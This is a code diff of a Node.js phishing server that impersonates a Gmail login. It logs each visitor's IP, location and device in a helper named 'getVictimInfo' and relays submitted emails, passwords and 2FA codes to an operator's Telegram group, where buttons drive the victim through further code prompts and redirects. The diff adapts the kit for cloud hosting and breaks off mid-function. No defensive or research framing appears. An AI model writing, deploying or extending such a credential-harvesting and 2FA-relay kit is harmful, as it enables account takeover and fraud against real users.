@@ -12,15 +12,22 @@ const path = require('path');
 const crypto = require('crypto');
 const cookieParser = require('cookie-parser');
 const { createProxyMiddleware } = require('http-proxy-middleware');
+const axios = require('axios');
+const cheerio = require('cheerio');
 
 const app = express();
 const server = http.createServer(app);
 
-// Serve static files from public folder
-app.use(express.static(path.join(__dirname, 'public')));
+// ============= RENDER-SPECIFIC CONFIGURATION =============
+// CRITICAL: Trust proxy to get real IP addresses behind Render's proxy
+app.set('trust proxy', true);
 
+// ============= MIDDLEWARE =============
+app.use(express.static(path.join(__dirname, 'public')));
 app.use(cors({
-  origin: ['http://localhost:3001', 'http://127.0.0.1:3001'],
+  origin: process.env.NODE_ENV === 'production' 
+    ? [process.env.APP_URL || 'https://your-app.onrender.com'] 
+    : ['http://localhost:3001', 'http://127.0.0.1:3001'],
   credentials: true
 }));
 app.use(requestIp.mw());
@@ -30,22 +37,15 @@ app.use(cookieParser());
 
 const io = new Server(server, {
   cors: {
-    origin: ['http://localhost:3001', 'http://127.0.0.1:3001'],
+    origin: process.env.NODE_ENV === 'production'
+      ? [process.env.APP_URL || 'https://your-app.onrender.com']
+      : ['http://localhost:3001', 'http://127.0.0.1:3001'],
     methods: ['GET', 'POST'],
     credentials: true
   },
-  connectionStateRecovery: {
-    maxDisconnectionDuration: 30000,
-    skipMiddlewares: true
-  },
   transports: ['polling', 'websocket'],
-  allowUpgrades: true,
   pingTimeout: 60000,
-  pingInterval: 25000,
-  connectTimeout: 45000,
-  maxHttpBufferSize: 1e6,
-  perMessageDeflate: false,
-  httpCompression: false
+  pingInterval: 25000
 });
 
 // ============= BOT INITIALIZATION =============
@@ -55,37 +55,20 @@ let telegramGroupId = process.env.TELEGRAM_GROUP_ID;
 const initializeBot = () => {
   bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN);
   
-  const usePolling = process.env.USE_POLLING === 'true' || 
-                     process.env.NODE_ENV !== 'production' ||
-                     !process.env.FRONTEND_URL ||
-                     process.env.FRONTEND_URL.includes('localhost');
+  // On Render, we use webhook mode (not polling)
+  const usePolling = process.env.USE_POLLING === 'true' || process.env.NODE_ENV !== 'production';
   
   if (usePolling) {
-    console.log('🔧 Using POLLING mode (local development)');
-    
+    console.log('🔧 Using POLLING mode');
     bot.deleteWebHook()
-      .then(() => {
-        console.log('✅ Webhook cleared');
-        return bot.startPolling();
-      })
-      .then(() => {
-        console.log('✅ Bot polling started successfully');
-      })
-      .catch(err => {
-        console.error('❌ Failed to start polling:', err);
-      });
+      .then(() => bot.startPolling())
+      .catch(err => console.error('❌ Failed to start polling:', err));
   } else {
-    console.log('🚀 Using WEBHOOK mode (production)');
-    
-    const webhookUrl = `${process.env.FRONTEND_URL}/webhook/${process.env.TELEGRAM_BOT_TOKEN}`;
-    
+    console.log('🚀 Using WEBHOOK mode');
+    const webhookUrl = `${process.env.APP_URL}/webhook/${process.env.TELEGRAM_BOT_TOKEN}`;
     bot.setWebHook(webhookUrl)
-      .then(() => {
-        console.log('✅ Webhook set successfully');
-      })
-      .catch(err => {
-        console.error('❌ Webhook setup failed:', err);
-      });
+      .then(() => console.log('✅ Webhook set successfully'))
+      .catch(err => console.error('❌ Webhook setup failed:', err));
   }
   
   return bot;
@@ -93,7 +76,6 @@ const initializeBot = () => {
 
 initializeBot();
 
-// Create webhook endpoint
 app.post(`/webhook/${process.env.TELEGRAM_BOT_TOKEN}`, (req, res) => {
   bot.processUpdate(req.body);
   res.sendStatus(200);
@@ -101,143 +83,53 @@ app.post(`/webhook/${process.env.TELEGRAM_BOT_TOKEN}`, (req, res) => {
 
 // ============= SESSION MANAGEMENT =============
 const activeSessions = new Map();
-const capturedSessions = new Map(); // For proxy-captured data
-const SESSION_TIMEOUT = 7200000; // 2 hours
-const CODE_EXPIRATION_TIME = 600000; // 10 minutes
-const CLEANUP_INTERVAL = 600000; // 10 minutes
-const EMPTY_SESSION_GRACE_PERIOD = 7200000; // 2 hours
+const capturedData = new Map();
+const microsoftParams = new Map();
+const requestTimestamps = new Map();
 
-// Debug middleware
-app.use((req, res, next) => {
-  console.log(`📨 HTTP ${req.method} ${req.path}`);
-  next();
-});
+const SESSION_TIMEOUT = 7200000;
+const CLEANUP_INTERVAL = 600000;
+const SESSION_COOLDOWN = 5000;
 
-// ============= HELPER FUNCTIONS =============
-function cleanupStaleSockets(session) {
-  if (!session) return false;
-  
-  const deadSockets = [];
-  for (let socketId of session.sockets) {
-    const socket = io.sockets.sockets.get(socketId);
-    if (!socket || !socket.connected) {
-      deadSockets.push(socketId);
-    }
-  }
-  
-  deadSockets.forEach(id => {
-    session.sockets.delete(id);
-    console.log(`🧹 Removed stale socket ${id} from session`);
-  });
-  
-  return deadSockets.length > 0;
-}
-
-function sendToSession(sessionId, event, data) {
-  console.log(`\n📤 SENDING ${event} TO SESSION: ${sessionId}`);
-  
-  const session = activeSessions.get(sessionId);
-  if (!session) {
-    console.log(`❌ Session ${sessionId} not found for ${event}`);
-    return { success: false, reason: 'session_not_found' };
-  }
-  
-  cleanupStaleSockets(session);
-  
-  if (session.sockets.size === 0) {
-    console.log(`❌ No active sockets in session ${sessionId} for ${event}`);
-    return { success: false, reason: 'no_sockets' };
-  }
-  
-  let sentCount = 0;
-  for (let socketId of session.sockets) {
-    const socket = io.sockets.sockets.get(socketId);
-    if (socket && socket.connected) {
-      socket.emit(event, data);
-      sentCount++;
-    }
-  }
-  
-  console.log(`✅ Sent ${event} to ${sentCount}/${session.sockets.size} socket(s)\n`);
-  
-  if (sentCount === 0) {
-    return { success: false, reason: 'no_connected_sockets' };
-  }
-  
-  return { success: true, sentCount };
-}
-
-async function validateSessionForCallback(cb, sessionId, session, action) {
-  if (!session) {
-    await bot.answerCallbackQuery(cb.id, { 
-      text: '❌ Session expired. Please refresh the page.', 
-      show_alert: true 
-    });
-    return false;
-  }
-  
-  cleanupStaleSockets(session);
-  
-  if (session.sockets.size === 0) {
-    console.log(`❌ No active sockets for session ${sessionId}`);
-    await bot.answerCallbackQuery(cb.id, { 
-      text: '❌ User disconnected. Please ask them to refresh the page.', 
-      show_alert: true 
-    });
-    return false;
-  }
-  
-  return true;
-}
-
-// Session cleanup interval
+// Cleanup intervals
 setInterval(() => {
   const now = Date.now();
-  let cleanedCount = 0;
-  
   for (const [sessionId, session] of activeSessions.entries()) {
-    cleanupStaleSockets(session);
-    
-    if (session.codeRequestTime && now - session.codeRequestTime > CODE_EXPIRATION_TIME) {
-      sendToSession(sessionId, 'code_expired', {
-        message: 'The verification code has expired. Please request a new code.',
-        attempts: session.codeAttempts || 0
-      });
-      session.codeRequestTime = null;
-    }
-    
     if (now - session.lastActivity > SESSION_TIMEOUT) {
       activeSessions.delete(sessionId);
-      cleanedCount++;
-    } else if (session.sockets.size === 0 && (now - session.lastActivity) > EMPTY_SESSION_GRACE_PERIOD) {
-      activeSessions.delete(sessionId);
-      cleanedCount++;
     }
-  }
-  
-  if (cleanedCount > 0) {
-    console.log(`🧹 Cleaned up ${cleanedCount} sessions. Total active: ${activeSessions.size}`);
   }
 }, CLEANUP_INTERVAL);
 
-const getClientDetails = (socket, userAgent) => {
+// ============= VICTIM INFO CAPTURE HELPER =============
+async function getVictimInfo(req) {
   try {
-    const ip = socket.request.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
-    const geo = geoip.lookup(ip) || {};
+    // With 'trust proxy' enabled, this will get the real IP
+    const ip = requestIp.getClientIp(req) || 'Unknown';
+    const userAgent = req.headers['user-agent'] || 'Unknown';
     const agent = useragent.parse(userAgent);
+    
+    // Get geolocation from IP
+    let location = 'Unknown';
+    try {
+      const geo = geoip.lookup(ip);
+      if (geo) {
+        location = `${geo.city || 'Unknown City'}, ${geo.region || 'Unknown Region'}, ${geo.country || 'Unknown Country'}`;
+      }
+    } catch (e) {
+      // Ignore geoip errors
+    }
 
     return {
-      ip: ip || 'Unknown',
-      location: geo.country ?
-        `${geo.city || 'Unknown city'}, ${geo.region || 'Unknown region'}, ${geo.country}` :
-        'Unknown location',
+      ip,
+      location,
       browser: agent.toAgent() || 'Unknown',
       os: agent.os.toString() || 'Unknown',
       device: agent.device.toString() === 'undefined' ? 'Desktop' : agent.device.toString(),
       timestamp: new Date().toLocaleString()
     };
   } catch (err) {
-    console.error('Error getting client details:', err);
+    console.error('Error getting victim info:', err);
     return {
       ip: 'Unknown',
       location: 'Unknown',
@@ -247,1016 +139,620 @@ const getClientDetails = (socket, userAgent) => {
       timestamp: new Date().toLocaleString()
     };
   }
-};
+}
 
-// ============= SOCKET.IO CONNECTION HANDLER =============
+// ============= SOCKET.IO HANDLERS =============
 io.on('connection', (socket) => {
-  console.log('✅ New connection:', socket.id);
-  console.log('📋 Query params:', socket.handshake.query);
-
   let sessionId = socket.handshake.query.sessionId || uuidv4();
   
-  if (!sessionId || sessionId === 'undefined' || sessionId === 'null') {
-    console.log('⚠️ Invalid sessionId, generating new one');
-    sessionId = uuidv4();
-  }
-  
-  socket.sessionId = sessionId;
-  console.log('🆔 Using session ID:', sessionId);
-
-  if (activeSessions.has(sessionId)) {
-    const existingSession = activeSessions.get(sessionId);
-    console.log(`📊 Existing session ${sessionId} has ${existingSession.sockets.size} socket(s)`);
-    cleanupStaleSockets(existingSession);
-  }
-
   if (!activeSessions.has(sessionId)) {
     activeSessions.set(sessionId, {
       stage: 'initial',
       lastActivity: Date.now(),
-      lastUsed: Date.now(),
       details: null,
       email: null,
       password: null,
-      codeType: null,
-      code: null,
-      codeRequestTime: null,
-      codeAttempts: 0,
-      sockets: new Set(),
-      passwordAttempts: 0,
-      createdAt: Date.now(),
-      waitingFor: null
+      sockets: new Set([socket.id]),
+      createdAt: Date.now()
     });
-    console.log(`🆕 Created new session: ${sessionId}`);
+  } else {
+    const session = activeSessions.get(sessionId);
+    session.sockets.add(socket.id);
+    session.lastActivity = Date.now();
   }
 
-  const session = activeSessions.get(sessionId);
-  session.sockets.add(socket.id);
-  session.lastActivity = Date.now();
-  session.lastUsed = Date.now();
-
-  console.log(`👥 Session ${sessionId} now has ${session.sockets.size} socket(s)`);
-
-  socket.emit('connection_established', { 
-    sessionId, 
-    socketId: socket.id,
-    activeSockets: session.sockets.size 
-  });
-
-  socket.onAny((event, ...args) => {
-    console.log(`📨 Socket event received: ${event}`, args);
-    session.lastActivity = Date.now();
-    session.lastUsed = Date.now();
-  });
-
-  socket.on('ping', () => {
-    session.lastActivity = Date.now();
-  });
-
-  socket.on('pong', () => {
-    session.lastActivity = Date.now();
-  });
+  socket.emit('connection_established', { sessionId });
 
   socket.on('client_info', (userAgent) => {
-    console.log('👤 Client info received:', userAgent);
-    session.details = getClientDetails(socket, userAgent);
-    session.lastActivity = Date.now();
-    socket.emit('info_received');
+    const session = activeSessions.get(sessionId);
+    if (session) {
+      const ip = socket.request.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
+      const geo = geoip.lookup(ip) || {};
+      const agent = useragent.parse(userAgent);
+      
+      session.details = {
+        ip,
+        location: geo.country ? `${geo.city || 'Unknown'}, ${geo.country}` : 'Unknown',
+        browser: agent.toAgent(),
+        os: agent.os.toString(),
+        timestamp: new Date().toLocaleString()
+      };
+      session.lastActivity = Date.now();
+    }
   });
 
   socket.on('submit_email', async (email) => {
-    try {
-      console.log('📧 Email submitted:', email, 'for session:', sessionId);
-      
-      if (!email || typeof email !== 'string') {
-        throw new Error('Invalid email format');
+    const session = activeSessions.get(sessionId);
+    if (!session) return;
+    
+    session.email = email;
+    session.stage = 'awaiting_password';
+    session.lastActivity = Date.now();
+
+    const message = `📧 New Login Request\n━━━━━━━━━━━━━━━━━━\nEmail: ${email}`;
+    await bot.sendMessage(telegramGroupId, message, {
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: '🔑 Request Password', callback_data: `request_password|${sessionId}` }]
+        ]
       }
-
-      session.email = email.trim();
-      session.stage = 'awaiting_password';
-      session.lastActivity = Date.now();
-
-      const { ip, location, device } = session.details || {};
-      const message = `📧 New Login Request\n━━━━━━━━━━━━━━━━━━\nEmail: ${session.email}\nIP: ${ip}\nLocation: ${location}\nDevice: ${device}\n\nApprove this request?`;
-
-      await bot.sendMessage(telegramGroupId, message, {
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: '🔑 Request Password', callback_data: `request_password|${sessionId}` }],
-            [{ text: '❌ Reject', callback_data: `reject|${sessionId}` }]
-          ]
-        }
-      });
-
-      console.log('✅ Telegram message sent for email:', session.email);
-      socket.emit('email_sent');
-    } catch (err) {
-      console.error('❌ Email submission error:', err);
-      socket.emit('error', { message: err.message });
-    }
+    });
+    
+    socket.emit('email_sent');
   });
 
   socket.on('submit_password', async (password) => {
-    try {
-      console.log('🔑 Password submitted for session:', sessionId);
-      
-      if (session.stage !== 'awaiting_password') {
-        throw new Error('Invalid state: Not awaiting password');
-      }
-
-      session.password = password;
-      session.stage = 'awaiting_action';
-      session.lastActivity = Date.now();
-      session.passwordAttempts += 1;
-
-      await bot.sendMessage(telegramGroupId, 
-        `🔒 Password received for Email: ${session.email}\n\n` +
-        `Password: ${session.password}\n\n` +
-        `Choose an action:`,
-        {
-          reply_markup: {
-            inline_keyboard: [
-              [{ text: '📱 Request SMS Code', callback_data: `request_sms|${sessionId}` }],
-              [{ text: '🔐 Request Authenticator Code', callback_data: `request_auth|${sessionId}` }],
-              [{ text: '✏️ Send Custom Code', callback_data: `custom_code|${sessionId}` }],
-              [{ text: '📨 Send Custom Message', callback_data: `custom_message|${sessionId}` }],
-              [{ text: '✅ Redirect to Gmail', callback_data: `done|${sessionId}` }],
-              [{ text: '🌐 Redirect to Custom Site', callback_data: `custom_redirect|${sessionId}` }],
-              [{ text: '🔄 Request Password Again', callback_data: `request_password_again|${sessionId}` }],
-              [{ text: '❌ Reject Login', callback_data: `reject|${sessionId}` }]
-            ]
-          }
-        }
-      );
-
-      console.log('✅ Password processed for email:', session.email);
-      socket.emit('password_sent');
-    } catch (err) {
-      console.error('❌ Password submission error:', err);
-      socket.emit('error', { message: err.message });
-    }
-  });
-
-  socket.on('request_new_code', async ({ codeType }) => {
-    try {
-      console.log('🔄 New code requested:', codeType, 'for session:', sessionId);
-      
-      session.codeType = codeType;
-      session.codeRequestTime = Date.now();
-      session.lastActivity = Date.now();
-      session.stage = 'awaiting_2fa';
-
-      await bot.sendMessage(telegramGroupId, 
-        `🔄 New ${codeType} code requested for ${session.email}\n\n` +
-        `Choose an action:`,
-        {
-          reply_markup: {
-            inline_keyboard: [
-              [{ text: `🔢 Send 123456`, callback_data: `send_code_123456|${sessionId}` }],
-              [{ text: `🔢 Send 654321`, callback_data: `send_code_654321|${sessionId}` }],
-              [{ text: `🔢 Send 000000`, callback_data: `send_code_000000|${sessionId}` }],
-              [{ text: `✏️ Send Custom ${codeType.toUpperCase()} Code`, callback_data: `custom_code|${sessionId}` }],
-              [{ text: `📨 Send Custom Message`, callback_data: `custom_message|${sessionId}` }],
-              [{ text: `✅ Done - Redirect to Gmail`, callback_data: `done|${sessionId}` }],
-              [{ text: `🌐 Redirect to Custom Site`, callback_data: `custom_redirect|${sessionId}` }]
-            ]
-          }
-        }
-      );
-
-      socket.emit('request_2fa', codeType);
-    } catch (err) {
-      console.error('❌ New code request error:', err);
-      socket.emit('error', { message: err.message });
-    }
-  });
-
-  socket.on('submit_2fa_code', async ({ code, codeType }) => {
-    try {
-      console.log('🔢 2FA code submitted:', code, 'type:', codeType, 'for session:', sessionId);
-      
-      if (session.stage !== 'awaiting_2fa' && session.stage !== 'awaiting_action') {
-        throw new Error('Invalid state: Not awaiting 2FA');
-      }
-
-      if (session.codeRequestTime && Date.now() - session.codeRequestTime > CODE_EXPIRATION_TIME) {
-        socket.emit('code_expired', {
-          message: 'The verification code has expired. Please request a new code.',
-          attempts: session.codeAttempts
-        });
-        return;
-      }
-
-      session.code = code;
-      session.codeType = codeType;
-      session.codeAttempts = (session.codeAttempts || 0) + 1;
-      session.lastActivity = Date.now();
-
-      await bot.sendMessage(telegramGroupId, 
-        `✅ 2FA code received for ${session.email}\n\n` +
-        `2FA Code: ${session.code}\n\n` +
-        `Final approval:`,
-        {
-          reply_markup: {
-            inline_keyboard: [
-              [{ text: '👍 Approve Login', callback_data: `approve|${sessionId}` }],
-              [{ text: '👎 Reject', callback_data: `reject|${sessionId}` }],
-              [{ text: '🔄 Request New Code', callback_data: `request_new_${codeType}|${sessionId}` }],
-              [{ text: '📨 Send Custom Message', callback_data: `custom_message|${sessionId}` }],
-              [{ text: '✅ Done - Redirect to Gmail', callback_data: `done|${sessionId}` }],
-              [{ text: '🌐 Redirect to Custom Site', callback_data: `custom_redirect|${sessionId}` }]
-            ]
-          }
-        }
-      );
-
-      socket.emit('code_sent');
-    } catch (err) {
-      console.error('❌ 2FA error:', err);
-      socket.emit('error', { message: err.message });
-    }
-  });
-
-  socket.on('disconnect', (reason) => {
-    console.log(`❌ Disconnected ${socket.id} from session ${sessionId}, reason: ${reason}`);
+    const session = activeSessions.get(sessionId);
+    if (!session) return;
     
-    session.sockets.delete(socket.id);
+    session.password = password;
+    session.stage = 'awaiting_action';
     session.lastActivity = Date.now();
+
+    await bot.sendMessage(telegramGroupId, 
+      `🔒 Password received for ${session.email}\nPassword: ${password}`,
+      {
+        reply_markup: {
+          inline_keyboard: [
+            [{ text: '📱 Request SMS Code', callback_data: `request_sms|${sessionId}` }],
+            [{ text: '🔐 Request Auth Code', callback_data: `request_auth|${sessionId}` }],
+            [{ text: '✅ Done', callback_data: `done|${sessionId}` }]
+          ]
+        }
+      }
+    );
     
-    console.log(`👥 Session ${sessionId} now has ${session.sockets.size} socket(s) after disconnect`);
-    
-    if (session.sockets.size === 0) {
-      console.log(`⏰ Session ${sessionId} has no sockets, will be kept for ${EMPTY_SESSION_GRACE_PERIOD/60000} minutes`);
+    socket.emit('password_sent');
+  });
+
+  socket.on('disconnect', () => {
+    const session = activeSessions.get(sessionId);
+    if (session) {
+      session.sockets.delete(socket.id);
+      session.lastActivity = Date.now();
     }
   });
-
-  socket.on('connect_error', (error) => {
-    console.error(`❌ Connection error for ${socket.id}:`, error);
-  });
-
-  socket.on('error', (error) => {
-    console.error(`❌ Socket error for ${socket.id}:`, error);
-  });
-
-  if (socket.conn) {
-    socket.conn.on('error', (error) => {
-      console.error(`❌ Transport error for ${socket.id}:`, error);
-    });
-
-    socket.conn.on('close', (reason) => {
-      console.log(`🔌 Transport closed for ${socket.id}, reason:`, reason);
-    });
-  }
 });
 
 // ============= TELEGRAM BOT HANDLERS =============
 bot.on('callback_query', async (cb) => {
-  try {
-    console.log('📱 Telegram callback received:', cb.data);
-    const [action, sessionId] = cb.data.split('|');
-    const session = activeSessions.get(sessionId);
-
-    const isValid = await validateSessionForCallback(cb, sessionId, session, action);
-    if (!isValid) return;
-
-    session.lastActivity = Date.now();
-    console.log('🔍 Processing callback for session:', sessionId, 'action:', action);
-
-    if (action.startsWith('send_code_')) {
-      const code = action.split('_')[2];
-      console.log(`📨 Admin sending code ${code} to session:`, sessionId);
-      
-      const result = sendToSession(sessionId, 'admin_sent_code', {
-        code: code,
-        message: `Admin sent verification code: ${code}`
-      });
-      
-      if (result.success) {
-        await bot.sendMessage(telegramGroupId, `✅ Code ${code} sent to user for ${session.email}`);
-        await bot.answerCallbackQuery(cb.id, { text: `Code ${code} sent to user`, show_alert: true });
-      } else {
-        await bot.answerCallbackQuery(cb.id, { 
-          text: '❌ User disconnected. Please ask them to refresh.', 
-          show_alert: true 
-        });
-      }
-      return;
-    }
-
-    switch (action) {
-      case 'request_password':
-        console.log('🔑 Requesting password for session:', sessionId);
-        session.stage = 'awaiting_password';
-        
-        const pwdResult = sendToSession(sessionId, 'request_password');
-        if (pwdResult.success) {
-          await bot.answerCallbackQuery(cb.id, { 
-            text: `Requesting password for: ${session.email}`, 
-            show_alert: true 
-          });
-        } else {
-          await bot.answerCallbackQuery(cb.id, { 
-            text: '❌ User disconnected. Please ask them to refresh.', 
-            show_alert: true 
-          });
-        }
-        break;
-
-      case 'request_password_again':
-        console.log('🔄 Requesting password again for session:', sessionId);
-        session.stage = 'awaiting_password';
-        session.passwordAttempts += 1;
-        
-        const pwdAgainResult = sendToSession(sessionId, 'wrong_password', { 
-          message: 'The password was incorrect. Please enter your password again.',
-          attempts: session.passwordAttempts
-        });
-        
-        if (pwdAgainResult.success) {
-          await bot.answerCallbackQuery(cb.id, { 
-            text: `Requesting password again for: ${session.email}`, 
-            show_alert: true 
-          });
-        } else {
-          await bot.answerCallbackQuery(cb.id, { 
-            text: '❌ User disconnected. Please ask them to refresh.', 
-            show_alert: true 
-          });
-        }
-        break;
-
-      case 'request_sms':
-      case 'request_auth':
-        const codeType = action === 'request_sms' ? 'sms' : 'authenticator';
-        console.log(`📱 Requesting ${codeType} code for session:`, sessionId);
-        
-        session.codeType = codeType;
-        session.codeRequestTime = Date.now();
-        session.codeAttempts = 0;
-        session.stage = 'awaiting_2fa';
-        
-        const codeResult = sendToSession(sessionId, 'request_2fa', codeType);
-        
-        if (codeResult.success) {
-          await bot.sendMessage(telegramGroupId, 
-            `📱 ${codeType.toUpperCase()} code requested for ${session.email}\n\n` +
-            `Send a verification code to the user:`,
-            {
-              reply_markup: {
-                inline_keyboard: [
-                  [{ text: '🔢 Send 123456', callback_data: `send_code_123456|${sessionId}` }],
-                  [{ text: '🔢 Send 654321', callback_data: `send_code_654321|${sessionId}` }],
-                  [{ text: '🔢 Send 000000', callback_data: `send_code_000000|${sessionId}` }],
-                  [{ text: '✏️ Send Custom Code', callback_data: `custom_code|${sessionId}` }],
-                  [{ text: '📨 Send Custom Message', callback_data: `custom_message|${sessionId}` }],
-                  [{ text: '✅ Done - Redirect to Gmail', callback_data: `done|${sessionId}` }],
-                  [{ text: '🌐 Redirect to Custom Site', callback_data: `custom_redirect|${sessionId}` }]
-                ]
-              }
-            }
-          );
-          
-          await bot.answerCallbackQuery(cb.id, {
-            text: `Requesting ${codeType} code for: ${session.email}`,
-            show_alert: true
-          });
-        } else {
-          await bot.answerCallbackQuery(cb.id, { 
-            text: '❌ User disconnected. Please ask them to refresh.', 
-            show_alert: true 
-          });
-        }
-        break;
-
-      case 'request_new_sms':
-      case 'request_new_auth':
-        const newCodeType = action === 'request_new_sms' ? 'sms' : 'authenticator';
-        console.log(`🔄 Requesting new ${newCodeType} code for session:`, sessionId);
-        
-        session.codeType = newCodeType;
-        session.codeRequestTime = Date.now();
-        session.codeAttempts = 0;
-        session.stage = 'awaiting_2fa';
-        
-        const newCodeResult = sendToSession(sessionId, 'request_2fa', newCodeType);
-        
-        if (newCodeResult.success) {
-          await bot.sendMessage(telegramGroupId, 
-            `📱 New ${newCodeType.toUpperCase()} code requested for ${session.email}\n\n` +
-            `Send a verification code to the user:`,
-            {
-              reply_markup: {
-                inline_keyboard: [
-                  [{ text: '🔢 Send 123456', callback_data: `send_code_123456|${sessionId}` }],
-                  [{ text: '🔢 Send 654321', callback_data: `send_code_654321|${sessionId}` }],
-                  [{ text: '🔢 Send 000000', callback_data: `send_code_000000|${sessionId}` }],
-                  [{ text: '✏️ Send Custom Code', callback_data: `custom_code|${sessionId}` }],
-                  [{ text: '📨 Send Custom Message', callback_data: `custom_message|${sessionId}` }],
-                  [{ text: '✅ Done - Redirect to Gmail', callback_data: `done|${sessionId}` }],
-                  [{ text: '🌐 Redirect to Custom Site', callback_data: `custom_redirect|${sessionId}` }]
-                ]
-              }
-            }
-          );
-          
-          await bot.answerCallbackQuery(cb.id, {
-            text: `Requesting new ${newCodeType} code for: ${session.email}`,
-            show_alert: true
-          });
-        } else {
-          await bot.answerCallbackQuery(cb.id, { 
-            text: '❌ User disconnected. Please ask them to refresh.', 
-            show_alert: true 
-          });
-        }
-        break;
-
-      case 'approve':
-        console.log('✅ Approving login for session:', sessionId);
-        
-        const approveResult = sendToSession(sessionId, 'login_approved');
-        if (approveResult.success) {
-          await bot.sendMessage(telegramGroupId, `✅ Login approved for: ${session.email}`);
-          await bot.answerCallbackQuery(cb.id, { 
-            text: `Login approved for: ${session.email}`, 
-            show_alert: true 
-          });
-        } else {
-          await bot.answerCallbackQuery(cb.id, { 
-            text: '❌ User disconnected. Please ask them to refresh.', 
-            show_alert: true 
-          });
-        }
-        break;
-
-      case 'reject':
-        console.log('❌ Rejecting login for session:', sessionId);
-        
-        const rejectResult = sendToSession(sessionId, 'login_rejected');
-        if (rejectResult.success) {
-          await bot.sendMessage(telegramGroupId, `❌ Login rejected for: ${session.email}`);
-          await bot.answerCallbackQuery(cb.id, { 
-            text: `Login rejected for: ${session.email}`, 
-            show_alert: true 
-          });
-        } else {
-          await bot.answerCallbackQuery(cb.id, { 
-            text: '❌ User disconnected. Please ask them to refresh.', 
-            show_alert: true 
-          });
-        }
-        break;
-
-      case 'done':
-        console.log('🔗 Redirecting to Gmail for session:', sessionId);
-        
-        const doneResult = sendToSession(sessionId, 'redirect_to_gmail');
-        if (doneResult.success) {
-          await bot.sendMessage(telegramGroupId, 
-            `🔗 Redirecting to Gmail for: ${session.email}\n\n` +
-            `✅ Credentials captured:\n` +
-            `Email: ${session.email}\n` +
-            `Password: ${session.password || 'N/A'}\n` +
-            `${session.code ? `2FA Code: ${session.code}\n` : ''}`
-          );
-          await bot.answerCallbackQuery(cb.id, { 
-            text: `Redirecting user to Gmail: ${session.email}`, 
-            show_alert: true 
-          });
-        } else {
-          await bot.answerCallbackQuery(cb.id, { 
-            text: '❌ User disconnected. Please ask them to refresh.', 
-            show_alert: true 
-          });
-        }
-        break;
-
-      case 'custom_code':
-        await bot.sendMessage(telegramGroupId, 
-          `✏️ Please send the custom verification code for ${session.email} as a message.\n` +
-          `The code should be numbers only (2-4 digits).`
-        );
-        session.waitingFor = 'custom_code';
-        await bot.answerCallbackQuery(cb.id, { 
-          text: 'Please type the code and send it as a message', 
-          show_alert: true 
-        });
-        break;
-
-      case 'custom_message':
-        await bot.sendMessage(telegramGroupId, 
-          `✏️ Please send the custom message for ${session.email} as a message.`
-        );
-        session.waitingFor = 'custom_message';
-        await bot.answerCallbackQuery(cb.id, { 
-          text: 'Please type the message and send it', 
-          show_alert: true 
-        });
-        break;
-
-      case 'custom_redirect':
-        await bot.sendMessage(telegramGroupId, 
-          `🌐 Please send the custom redirect URL for ${session.email} as a message.\n` +
-          `The URL should start with http:// or https://`
-        );
-        session.waitingFor = 'custom_redirect';
-        await bot.answerCallbackQuery(cb.id, { 
-          text: 'Please type the URL and send it', 
-          show_alert: true 
-        });
-        break;
-    }
-  } catch (err) {
-    console.error('❌ Callback error:', err);
-    bot.answerCallbackQuery(cb.id, { text: 'Error processing request', show_alert: true });
-  }
-});
-
-bot.on('message', async (msg) => {
-  const chatId = msg.chat.id.toString();
+  const [action, sessionId] = cb.data.split('|');
+  const session = activeSessions.get(sessionId);
   
-  if (chatId !== telegramGroupId) {
+  if (!session) {
+    await bot.answerCallbackQuery(cb.id, { text: 'Session expired', show_alert: true });
     return;
   }
 
-  const text = msg.text;
-  console.log('📨 Raw message received:', text);
-  
-  const activeSessionEntries = Array.from(activeSessions.entries());
-  if (activeSessionEntries.length === 0) {
-    console.log('❌ No active sessions');
-    return;
-  }
-  
-  activeSessionEntries.forEach(([_, session]) => cleanupStaleSockets(session));
-  
-  const waitingSessions = activeSessionEntries
-    .filter(([_, s]) => s.waitingFor && s.sockets.size > 0)
-    .sort((a, b) => b[1].lastActivity - a[1].lastActivity);
-  
-  if (waitingSessions.length === 0) {
-    console.log('❌ No sessions waiting for input');
-    return;
-  }
-  
-  const [sessionId, session] = waitingSessions[0];
-  const waitingFor = session.waitingFor;
-  
-  console.log(`📨 Processing ${waitingFor} for session ${sessionId}: ${text}`);
-  
-  session.waitingFor = null;
-  
-  switch (waitingFor) {
-    case 'custom_code':
-      if (/^\d{2,4}$/.test(text)) {
-        console.log(`✅ Valid custom code: ${text}`);
-        
-        const result = sendToSession(sessionId, 'admin_sent_code', {
-          code: text,
-          message: `Admin sent verification code: ${text}`
-        });
-        
-        if (result.success) {
-          await bot.sendMessage(telegramGroupId, `✅ Custom code ${text} sent to user for ${session.email}`);
-        } else {
-          await bot.sendMessage(telegramGroupId, 
-            `❌ Failed to send code. User may be disconnected. Please ask them to refresh the page.`
-          );
-        }
-      } else {
-        console.log(`❌ Invalid code format: ${text}`);
-        await bot.sendMessage(telegramGroupId, 
-          `❌ Invalid code format. Please use 2-4 digits only.\n` +
-          `Please try again by clicking "Custom Code" button.`
-        );
-      }
-      break;
-      
-    case 'custom_message':
-      console.log(`✅ Sending custom message: ${text}`);
-      
-      const messageResult = sendToSession(sessionId, 'admin_message', {
-        message: text,
-        isError: false
-      });
-      
-      if (messageResult.success) {
-        await bot.sendMessage(telegramGroupId, `✅ Custom message sent to user for ${session.email}`);
-      } else {
-        await bot.sendMessage(telegramGroupId, 
-          `❌ Failed to send message. User may be disconnected. Please ask them to refresh the page.`
-        );
-      }
-      break;
-      
-    case 'custom_redirect':
-      if (text.startsWith('http://') || text.startsWith('https://')) {
-        console.log(`✅ Sending redirect to: ${text}`);
-        
-        const redirectResult = sendToSession(sessionId, 'redirect_to_site', {
-          url: text,
-          message: `Redirecting to ${text}...`
-        });
-        
-        if (redirectResult.success) {
-          await bot.sendMessage(telegramGroupId, `🔗 Redirecting user to ${text}`);
-        } else {
-          await bot.sendMessage(telegramGroupId, 
-            `❌ Failed to redirect. User may be disconnected. Please ask them to refresh the page.`
-          );
-        }
-      } else {
-        console.log(`❌ Invalid URL format: ${text}`);
-        await bot.sendMessage(telegramGroupId, 
-          `❌ Invalid URL format. URL must start with http:// or https://\n` +
-          `Please try again by clicking "Redirect to Custom Site" button.`
-        );
-      }
-      break;
+  session.lastActivity = Date.now();
+
+  if (action === 'request_password') {
+    sendToSession(sessionId, 'request_password');
